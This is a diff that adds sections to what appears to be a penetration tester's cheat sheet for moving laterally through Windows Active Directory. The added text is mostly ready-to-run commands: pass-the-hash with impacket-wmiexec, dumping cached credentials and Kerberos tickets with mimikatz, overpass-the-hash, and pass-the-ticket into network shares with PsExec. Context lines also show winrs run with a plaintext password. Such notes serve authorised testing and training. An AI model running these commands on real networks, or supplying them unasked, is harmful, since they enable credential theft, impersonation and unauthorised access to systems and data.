@@ -642,3 +642,35 @@ winrs -r:dc.testad.local -u:b0b -p:SuperAdmin  "cmd /c hostname & whoami"
 #Or you can just push in a remote shell as the command if you will
 
 #To access with WMI over PowerShell or just PowerShell remoting check out the enumhelper.ps1
+
+#Pass the Hash with impacket wmiexec from a Linux host
+#This requires the ADMIN$ share to be available and Windows File and Priter Sharing to be enabled. Works only on services using NTLM auth and uses SMB (TCP 445).
+#So works in situations where LA (Local Admin) password hash has been obtained:
+/usr/bin/impacket-wmiexec -hashes :3621C2A13F85C7B90B2DB1A990AF411B Administrator@192.168.12.34
+
+#Overpass the Hash, abusing NTLM hash to gain a full TGT and leverage it to gain a TGS.
+#For example run a program as some other user. Get user and their cached hash with mimikatz:
+privilege::debug
+sekurlsa::logonpasswords
+#Turn the NTLM hash into a Kerberos ticket with mimikatz, thus avoiding usage of NTLM authentication and start a new ps session as the impersonated user:
+sekurlsa::pth /user:user_name /domain:testad.local /ntlm:123abc45d6789012ef3a45678bc90123 /run:powershell
+#Cache a Kerberos ticket by authenticating to a net share (any other command leveraging requiring domain credentials):
+net use \\shared01
+#Show the cached tickets:
+klist
+#Now we can run PsExec with the cached tickets as it doesn't allow hashes:
+.\PsExec.exe \\shared01 cmd
+
+#Pass the Ticket
+#If the user doesn't for example have credentials to a share where another user on the same PC has (\\shared01\usernamesfolder), we can leverage mimikatz to extract TGT/TGS from memory:
+privilege::debug
+sekurlsa::tickets /export
+#This will export all TGT/TGS from memory to per ticket .kirbi files
+#If there are any @cifs files, it means that the user@cifs has an existing session and a TGS ticket, which can then be injected into your user session:
+kerberos::ptt [0;1a2ef]-0-0-40810000-username@cifs-shared01.kirbi
+#Verify with
+klist
+ls \\shared01\usernamesfolder
+
+#Distributed Component Object Model a.k.a. DCOM
+#DCOM communicates over RPC on TCP 135 and LA credentials are required to leverage the DCOM Service Control Manager (API)
